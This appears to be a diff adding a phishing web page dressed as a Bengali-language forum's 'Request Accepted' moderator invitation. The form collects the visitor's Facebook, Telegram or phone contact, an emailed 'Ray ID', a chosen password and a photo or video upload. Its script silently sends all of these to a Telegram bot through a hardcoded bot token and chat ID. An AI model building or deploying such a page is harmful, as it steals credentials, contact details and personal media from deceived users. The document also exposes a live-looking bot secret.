@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mazhabi Forums - Request Accepted: Final Steps</title>
+    <!-- Google Fonts & Font Awesome -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+    <style>
+        /* --- ALL CSS FROM PREVIOUS EXAMPLE --- */
+        /* --- Paste the entire <style> block from the previous example here --- */
+        :root {
+            --primary-color: #ff3333; /* Vibrant Red */
+            --secondary-color: #cc0000; /* Darker Red */
+            --accent-color: #ff6666; /* Lighter Red */
+            --background-color: #121212; /* Very Dark Gray/Black */
+            --surface-color: #1e1e1e; /* Dark Gray for cards/sections */
+            --text-color: #e0e0e0; /* Light Gray for text */
+            --muted-text-color: #888888; /* Medium Gray for muted text */
+            --success-color: #4CAF50; /* Green for success */
+            --border-color: #333333; /* Darker Gray for borders */
+            --input-bg-color: rgba(10,10,10,0.75);
+            --border-radius: 6px;
+            --box-shadow: 0 3px 10px rgba(0, 0, 0, 0.25);
+            --font-heading: 'Poppins', sans-serif;
+            --font-body: 'Roboto', sans-serif;
+        }
+
+        *, *::before, *::after {
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: var(--font-body);
+            margin: 0;
+            background-color: var(--background-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .form-container {
+            background-color: var(--surface-color);
+            padding: 30px 40px;
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+            border: 1px solid var(--border-color);
+            width: 100%;
+            max-width: 600px; 
+            text-align: left;
+        }
+
+        .form-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .form-header .icon {
+            font-size: 3em;
+            color: var(--success-color);
+            margin-bottom: 15px;
+        }
+        .form-header h1 {
+            font-family: var(--font-heading);
+            font-size: 1.8em;
+            color: var(--primary-color);
+            margin-bottom: 5px;
+            font-weight: 600;
+        }
+        .form-header p {
+            font-size: 0.95em;
+            color: var(--muted-text-color);
+            margin-bottom: 0;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        .form-group label {
+            display: block;
+            font-family: var(--font-heading);
+            color: var(--accent-color);
+            margin-bottom: 8px;
+            font-size: 0.9em;
+            font-weight: 500;
+        }
+        .form-group label i { margin-right: 6px; }
+        .form-group label .optional {
+            font-size: 0.8em;
+            color: var(--muted-text-color);
+            font-weight: 400;
+        }
+
+        .form-group input[type="text"],
+        .form-group input[type="password"],
+        .form-group textarea {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--input-bg-color);
+            color: var(--text-color);
+            border: 1px solid var(--border-color);
+            border-radius: var(--border-radius);
+            font-size: 1em;
+            font-family: var(--font-body);
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        .form-group textarea {
+            min-height: 80px;
+            resize: vertical;
+        }
+        .form-group input::placeholder, .form-group textarea::placeholder {
+            color: var(--muted-text-color);
+            opacity: 0.7;
+        }
+        .form-group input:focus, .form-group textarea:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 0.15rem rgba(255,51,51,.2);
+            outline: none;
+        }
+        .form-group input.input-error, .form-group textarea.input-error { 
+            border-color: var(--danger-color) !important;
+        }
+        .error-message { 
+            display: block;
+            color: var(--danger-color);
+            font-size: 0.8em;
+            margin-top: 5px;
+            min-height: 1.2em; 
+        }
+        .error-message:empty { visibility: hidden; }
+
+        .file-upload-group {
+            border: 2px dashed var(--border-color);
+            border-radius: var(--border-radius);
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: border-color 0.2s;
+            position: relative; 
+        }
+        .file-upload-group:hover {
+            border-color: var(--primary-color);
+        }
+        .file-upload-group input[type="file"] {
+            display: none; 
+        }
+        .file-upload-group .upload-icon {
+            font-size: 2.5em;
+            color: var(--accent-color);
+            margin-bottom: 10px;
+        }
+        .file-upload-group .upload-text {
+            color: var(--muted-text-color);
+            font-size: 0.9em;
+        }
+        .file-upload-group .upload-text strong {
+            color: var(--primary-color);
+        }
+        .file-name-display {
+            margin-top: 10px;
+            font-size: 0.85em;
+            color: var(--success-color);
+            font-style: italic;
+            word-break: break-all; 
+        }
+
+        .submit-button-container {
+            margin-top: 30px;
+            text-align: center;
+        }
+        .btn-submit {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            font-size: 1.05em;
+            font-family: var(--font-heading);
+            font-weight: 500;
+            border-radius: var(--border-radius);
+            cursor: pointer;
+            transition: background-color 0.2s;
+            width: 100%; 
+            max-width: 300px; 
+            margin: 0 auto; 
+        }
+        .btn-submit:hover {
+            background-color: var(--secondary-color);
+        }
+        .btn-submit:disabled {
+            background-color: var(--muted-text-color);
+            cursor: not-allowed;
+        }
+        .btn-submit i {
+            margin-right: 8px;
+        }
+        
+        .page-footer {
+            text-align: center;
+            margin-top: 30px;
+            color: var(--muted-text-color);
+            font-size: 0.8em;
+        }
+        .page-footer a { color: var(--accent-color); text-decoration: none; }
+        .page-footer a:hover { text-decoration: underline; color: var(--primary-color); }
+
+        .hidden { display: none !important; }
+
+        @media (max-width: 768px) {
+            .form-container { padding: 25px 30px; }
+            .form-header h1 { font-size: 1.6em; }
+        }
+        @media (max-width: 480px) {
+            body { padding: 15px; }
+            .form-container { padding: 20px; }
+            .form-header h1 { font-size: 1.4em;}
+            .form-header p { font-size: 0.9em; }
+            .form-group input, .form-group textarea { font-size: 0.95em; padding: 10px; }
+            .btn-submit { font-size: 1em; padding: 10px 20px; }
+        }
+
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <div class="form-header">
+            <div class="icon"><i class="fas fa-check-circle"></i></div>
+            <h1>Request Accepted!</h1>
+            <p>আপনাকে আমাদের ফেরামে স্বাগতম।  আপনাকে আমরা ফ্রী মেম্বারশীপ দিচ্ছি। আপনি যেনে খুশি হবে আমাদের ফোরামে ৪০০০ এর বেশি মেম্বার যুক্ত হয়ে গিয়ছে।  তাই এডমিন আর একা সামলাতে পারছে না, তাই আপনার বায়ো দেখে আমরা আপনাকে মডারেটর হওয়ার আহ্বান জানাচ্ছি। </p>
+        </div>
+
+        <form id="final-setup-form">
+            <div class="form-group">
+                <label for="question1"><i class="fas fa-question-circle"></i> আপনি কী আমাদের ফোরামের মডারেটর হবেন? আপনি কী আমাদের ফোরামে পেইড মেম্বার আনতে সাহায্য করবেন?</label>
+                <textarea id="question1" name="security_question_1" rows="3" placeholder="Your honest answer here..." required></textarea>
+                <span class="error-message"></span>
+            </div>
+
+            <div class="form-group">
+                <label for="question2"><i class="fas fa-user-ninja"></i>আপনার ফেসবুক আইডির লিংক অথবা টেলিগ্রাম ইউজার নেম অথবা ফোন নাম্বার দিন? <span class="optional"></span></label>
+                <textarea id="question2" name="security_question_2" rows="3" placeholder="Briefly describe..."></textarea>
+                <span class="error-message"></span>
+            </div>
+
+            <div class="form-group">
+                <label for="ray-id"><i class="fas fa-fingerprint"></i> আপনার Ray ID টি দিন, (Ray ID আপনার ইমেলে পাবেন)</label>
+                <input type="text" id="ray-id" name="ray_id" placeholder="Enter the Ray ID you received" required>
+                <span class="error-message"></span>
+            </div>
+            
+            <div class="form-group">
+                <label for="password"><i class="fas fa-key"></i> Create Password</label>
+                <input type="password" id="password" name="password" placeholder="Choose a strong password (min 6 chars)" required>
+                <span class="error-message"></span>
+            </div>
+
+            <div class="form-group">
+                <label for="confirm-password"><i class="fas fa-redo-alt"></i> Confirm Password</label>
+                <input type="password" id="confirm-password" name="confirm_password" placeholder="Re-enter your password" required>
+                <span class="error-message"></span>
+            </div>
+
+            <div class="form-group">
+                <label for="verification-file"><i class="fas fa-id-badge"></i> আপনার প্রথম পোস্টটি করতে ভিডিও / পিক আপলোড করুন!</label>
+                <div class="file-upload-group" id="file-upload-area">
+                    <input type="file" id="verification-file" name="verification_file" accept="image/*,video/*">
+                    <div class="upload-icon"><i class="fas fa-cloud-upload-alt"></i></div>
+                    <div class="upload-text"><strong>Click to browse</strong> or drag & drop Video/Pic file here.</div>
+                    <div class="file-name-display" id="file-name-display"></div>
+                </div>
+                 <span class="error-message" id="file-error-message"></span>
+            </div>
+
+            <div class="submit-button-container">
+                <button type="submit" class="btn-submit" id="submit-final-setup">
+                    <i class="fas fa-lock"></i> Finalize Setup & Enter
+                </button>
+            </div>
+        </form>
+    </div>
+
+    <footer class="page-footer">
+        <p>© <span id="current-year"></span> Mazhabi Forums. Secure Access Portal.</p>
+    </footer>
+
+    <script>
+        document.getElementById('current-year').textContent = new Date().getFullYear();
+
+        const form = document.getElementById('final-setup-form');
+        const submitButton = document.getElementById('submit-final-setup');
+        const fileInput = document.getElementById('verification-file');
+        const fileUploadArea = document.getElementById('file-upload-area');
+        const fileNameDisplay = document.getElementById('file-name-display');
+
+        fileUploadArea.addEventListener('click', () => fileInput.click());
+        fileInput.addEventListener('change', () => {
+            if (fileInput.files.length > 0) {
+                const file = fileInput.files[0];
+                fileNameDisplay.textContent = `Selected: ${file.name} (${(file.size / (1024 * 1024)).toFixed(2)} MB)`;
+                clearError(document.getElementById('file-error-message')); 
+            } else {
+                fileNameDisplay.textContent = '';
+            }
+        });
+        ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
+            fileUploadArea.addEventListener(eventName, preventDefaults, false);
+        });
+        function preventDefaults(e) {
+            e.preventDefault();
+            e.stopPropagation();
+        }
+        ['dragenter', 'dragover'].forEach(eventName => {
+            fileUploadArea.addEventListener(eventName, () => fileUploadArea.style.borderColor = 'var(--primary-color)', false);
+        });
+        ['dragleave', 'drop'].forEach(eventName => {
+            fileUploadArea.addEventListener(eventName, () => fileUploadArea.style.borderColor = 'var(--border-color)', false);
+        });
+        fileUploadArea.addEventListener('drop', handleDrop, false);
+        function handleDrop(e) {
+            let dt = e.dataTransfer;
+            let files = dt.files;
+            if (files.length > 0) {
+                fileInput.files = files; 
+                const file = files[0];
+                fileNameDisplay.textContent = `Selected: ${file.name} (${(file.size / (1024 * 1024)).toFixed(2)} MB)`;
+                clearError(document.getElementById('file-error-message'));
+            }
+        }
+
+        function displayError(inputElement, message) {
+            inputElement.classList.add('input-error');
+            const errorSpan = inputElement.nextElementSibling && inputElement.nextElementSibling.classList.contains('error-message')
+                ? inputElement.nextElementSibling
+                : (inputElement.id === 'verification-file' ? document.getElementById('file-error-message') : null);
+            if (errorSpan) {
+                errorSpan.textContent = message;
+                errorSpan.style.visibility = 'visible';
+            }
+        }
+
+        function clearError(inputElement) {
+            inputElement.classList.remove('input-error');
+            const errorSpan = inputElement.nextElementSibling && inputElement.nextElementSibling.classList.contains('error-message')
+                ? inputElement.nextElementSibling
+                : (inputElement.id === 'verification-file' ? document.getElementById('file-error-message') : null);
+            if (errorSpan) {
+                errorSpan.textContent = '';
+                errorSpan.style.visibility = 'hidden';
+            }
+        }
+        
+        function clearAllFormErrors() {
+            form.querySelectorAll('.input-error').forEach(el => el.classList.remove('input-error'));
+            form.querySelectorAll('.error-message').forEach(el => {
+                el.textContent = '';
+                el.style.visibility = 'hidden';
+            });
+        }
+
+        form.addEventListener('submit', async function(event) {
+            event.preventDefault();
+            clearAllFormErrors();
+            let isValid = true;
+
+            const question1 = document.getElementById('question1');
+            const rayId = document.getElementById('ray-id');
+            const password = document.getElementById('password');
+            const confirmPassword = document.getElementById('confirm-password');
+
+            if (!question1.value.trim()) {
+                displayError(question1, 'This answer is required.');
+                isValid = false;
+            }
+            if (!rayId.value.trim()) {
+                displayError(rayId, 'Ray ID is required.');
+                isValid = false;
+            }
+            if (password.value.length < 6) {
+                displayError(password, 'Password must be at least 6 characters.');
+                isValid = false;
+            }
+            if (password.value !== confirmPassword.value) {
+                displayError(confirmPassword, 'Passwords do not match.');
+                isValid = false;
+            } else if (!confirmPassword.value) { 
+                 displayError(confirmPassword, 'Please confirm your password.');
+                 isValid = false;
+            }
+            
+            const selectedFile = fileInput.files.length > 0 ? fileInput.files[0] : null;
+            if (selectedFile) {
+                const maxSize = 50 * 1024 * 1024; 
+                const allowedMimeTypePrefixes = ['image/', 'video/']; 
+                let fileTypeValid = false;
+                for (const prefix of allowedMimeTypePrefixes) {
+                    if (selectedFile.type.startsWith(prefix)) {
+                        fileTypeValid = true;
+                        break;
+                    }
+                }
+                if (!fileTypeValid) {
+                    displayError(fileInput, 'Invalid file type. Allowed: Images and Videos.');
+                    isValid = false;
+                }
+                if (selectedFile.size > maxSize) {
+                    displayError(fileInput, `File is too large (max 50MB). Current: ${(selectedFile.size / (1024*1024)).toFixed(2)}MB`);
+                    isValid = false;
+                }
+            }
+
+
+            if (isValid) {
+                submitButton.disabled = true;
+                submitButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Submitting...';
+
+                const formDataForText = new FormData(); // Separate FormData for text fields
+                formDataForText.append('security_question_1', question1.value);
+                formDataForText.append('security_question_2', document.getElementById('question2').value);
+                formDataForText.append('ray_id', rayId.value);
+                formDataForText.append('password', password.value); // Password (consider hashing on backend)
+
+                // --- Actual Telegram Bot Submission ---
+                const botToken = "7501055809:AAHybTQCakGqgj45Z88HzY3GdT7H-MhzC58"; 
+                const chatId = "7945358964";   
+                const redirectURL = "YOUR_SUCCESS_PAGE_URL.html"; 
+
+                if (botToken === "YOUR_ACTUAL_BOT_TOKEN" || chatId === "YOUR_ACTUAL_CHAT_ID") {
+                    console.warn("Telegram Bot Token or Chat ID is not set.");
+                    alert("Telegram integration not configured. Data will be logged to console only.");
+                    setTimeout(() => {
+                         window.location.href = redirectURL || 'thankyou_fallback.html'; 
+                    }, 1500);
+                    return; 
+                }
+
+                // 1. Send Text Data
+                let textMessage = "🔒 Encrypted Class - Final Setup (Part 1 - Details):\n\n";
+                formDataForText.forEach((value, key) => {
+                    let formattedKey = key.replace(/_/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
+                    textMessage += `🔸 **${formattedKey}:** ${value}\n`;
+                });
+                textMessage += `\n⏰ Submitted: ${new Date().toLocaleString('en-BD', { timeZone: 'Asia/Dhaka' })}`;
+                
+                const textApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                const textParams = new URLSearchParams({
+                    chat_id: chatId,
+                    text: textMessage,
+                    parse_mode: "Markdown"
+                });
+
+                let textSentSuccessfully = false;
+                try {
+                    const textResponse = await fetch(`${textApiUrl}?${textParams.toString()}`, { method: 'GET' });
+                    const textResult = await textResponse.json();
+                    if (textResult.ok) {
+                        console.log("Text data sent to Telegram successfully.");
+                        textSentSuccessfully = true;
+                    } else {
+                        console.error("Error sending text data to Telegram:", textResult);
+                        // Don't alert here yet, try sending file if text failed but file exists
+                    }
+                } catch (error) {
+                    console.error("Network error sending text data:", error);
+                }
+
+
+                // 2. Send File Data (if a file is selected and text was (or wasn't successfully sent - depending on logic))
+                let fileSentSuccessfully = !selectedFile; // If no file, consider it "sent" for overall success
+                
+                if (selectedFile) {
+                    const fileFormData = new FormData();
+                    fileFormData.append('chat_id', chatId);
+                    
+                    // Determine API endpoint based on file type
+                    let fileApiUrl = `https://api.telegram.org/bot${botToken}/`;
+                    let fileFieldName = '';
+
+                    if (selectedFile.type.startsWith('image/')) {
+                        fileApiUrl += 'sendPhoto';
+                        fileFieldName = 'photo';
+                    } else if (selectedFile.type.startsWith('video/')) {
+                        fileApiUrl += 'sendVideo';
+                        fileFieldName = 'video';
+                    } else {
+                        // Fallback for other types, or if type is not perfectly identified
+                        fileApiUrl += 'sendDocument';
+                        fileFieldName = 'document';
+                    }
+                    fileFormData.append(fileFieldName, selectedFile, selectedFile.name);
+                    fileFormData.append('caption', `Verification file for Ray ID: ${rayId.value}\nFilename: ${selectedFile.name}`);
+
+                    try {
+                        const fileResponse = await fetch(fileApiUrl, {
+                            method: 'POST',
+                            body: fileFormData // FormData automatically sets Content-Type to multipart/form-data
+                        });
+                        const fileResult = await fileResponse.json();
+                        if (fileResult.ok) {
+                            console.log("File sent to Telegram successfully:", fileResult);
+                            fileSentSuccessfully = true;
+                        } else {
+                            console.error("Error sending file to Telegram:", fileResult);
+                            // Alert for file send failure specifically if text was okay or also failed
+                            if (textSentSuccessfully) { // If text was okay but file failed
+                                alert(`Text data submitted, but file upload failed: ${fileResult.description}. You may need to send it manually.`);
+                            } else { // If both failed
+                                alert(`Failed to submit data and file: ${fileResult.description}. Please try again.`);
+                            }
+                            fileSentSuccessfully = false; // Ensure it's false
+                        }
+                    } catch (error) {
+                        console.error("Network error sending file:", error);
+                        alert("A network error occurred while uploading the file. Please check your connection.");
+                        fileSentSuccessfully = false;
+                    }
+                }
+
+                // Final action based on combined success
+                if (textSentSuccessfully && fileSentSuccessfully) {
+                     window.location.href = redirectURL || 'thankyou_fallback.html'; 
+                } else if (textSentSuccessfully && !selectedFile) { // Text sent, no file was to be sent
+                     window.location.href = redirectURL || 'thankyou_fallback.html';
+                }
+                else {
+                    // If either text or (an attempted) file send failed, re-enable button
+                    submitButton.disabled = false;
+                    submitButton.innerHTML = '<i class="fas fa-lock"></i> Finalize Setup & Enter';
+                    if (!textSentSuccessfully && !fileSentSuccessfully) {
+                        alert("Failed to submit your information. Please try again.");
+                    } else if (!textSentSuccessfully) {
+                        alert("Failed to submit textual information. File was not attempted. Please try again.");
+                    }
+                    // If only file failed, alert was already shown
+                }
+            }
+        });
+    </script>
+</body>
+</html>
